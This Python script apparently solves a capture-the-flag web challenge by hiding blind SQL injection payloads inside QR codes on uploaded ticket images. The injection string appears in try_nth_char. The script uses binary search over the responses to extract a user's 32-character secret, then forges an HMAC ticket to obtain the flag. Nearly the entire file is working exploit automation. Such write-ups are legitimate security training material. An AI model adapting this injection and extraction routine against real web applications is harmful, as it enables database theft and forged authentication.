import hashlib
import hmac
import io
import qrcode
import random
import re
import requests
import string
from PIL import Image


CODE_DIM = (400, 400)
OFFSET = (350, 50)
TICKET_PATH = 'free_ticket.png'

LOGIN_URL = 'https://easy.web.uw2017.p4.team/login'
REGISTER_URL = 'https://easy.web.uw2017.p4.team/register'
VALIDATE_URL = 'https://easy.web.uw2017.p4.team/validate'

QUERY_OK = 'i znajduje się w naszej bazie danych'
QUERY_WRONG = 'i nie znajduje się w naszej bazie danych'
TICKET_OK = 'Twój bilet jest poprawny'
TICKET_WRONG = 'Twój bilet ma niepoprawny typ'


def create_code(content):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L)
    qr.add_data(content)
    qr.make(fit=True)
    return qr.make_image().resize(CODE_DIM)


def create_ticket(content):
    img = Image.open(TICKET_PATH)
    code = create_code(content)
    img.paste(code, OFFSET)
    return img


def transform_to_byte_file(image):
    imgByteArr = io.BytesIO()
    image.save(imgByteArr, 'PNG')
    return imgByteArr.getvalue()


def create_ticket_file(content):
    img = create_ticket(content)
    return transform_to_byte_file(img)


def hmac_ticket(user_secret, ticket_type):
    return hmac.new(user_secret.encode('utf-8'), ticket_type.encode('utf-8'), hashlib.sha256).hexdigest()


def get_random_string(n):
    ALPHABET = list(string.ascii_letters + string.digits)

    return ''.join(random.choice(ALPHABET) for _ in range(n))


class EasyWeb():
    sess = None
    reg = re.compile("<div class=\"alert alert-info\">([\w\W]*?)</div>")
    uname_hash = None

    def register(self, username, password):
        user_data = {
            'username': username,
            'password': password,
            'repeat_password': password,
        }

        self.sess = requests.session()
        response = self.sess.post(REGISTER_URL, data=user_data)


    def login(self, username, password):
        login_data = {
            'username': username,
            'password': password,
        }

        self.uname_hash = hashlib.sha256(username.encode('utf-8')).hexdigest()
        response = self.sess.post(LOGIN_URL, data=login_data)


    def check_ticket(self, content, print_info=False):
        ticket = create_ticket_file(content)
        files = {
            'ticket': ('ticket.png', ticket)
        }

        response = self.sess.post(
            VALIDATE_URL,
            files=files,
        )

        if print_info:
            print(content)

            info = self.reg.search(response.text)
            if info:
                print(info.group(1).strip())
            else:
                print(response.text)

        return QUERY_OK in response.text


    def try_nth_char(self, n, ch):
        return self.check_ticket('a" or substring((SELECT user_secret FROM {} limit 1), {}, 1) <= "{}"#'
            .format(self.uname_hash, n, ch))


    def find_nth_char(self, n):
        ALPHABET = '0123456789abcdef'

        def bin_search(b, e):
            if b == e:
                return b
            else:
                m = (b + e) // 2
                if self.try_nth_char(n, ALPHABET[m]):
                    return bin_search(b, m)
                else:
                    return bin_search(m+1, e)

        i = bin_search(0, len(ALPHABET) - 1)
        return ALPHABET[i]


    def find_user_secret(self):
        user_secret = ''
        for i in range(1, 33):
            c = self.find_nth_char(i)
            user_secret += c
            print(user_secret)

        return user_secret


if __name__ == '__main__':
    ew = EasyWeb()
    username = get_random_string(10)
    password = get_random_string(10)

    print(username, password)

    ew.register(username, password)
    ew.login(username, password)

    user_secret = ew.find_user_secret()

    t = hmac_ticket(user_secret, 'flaga')

    ew.check_ticket(t, print_info=True)
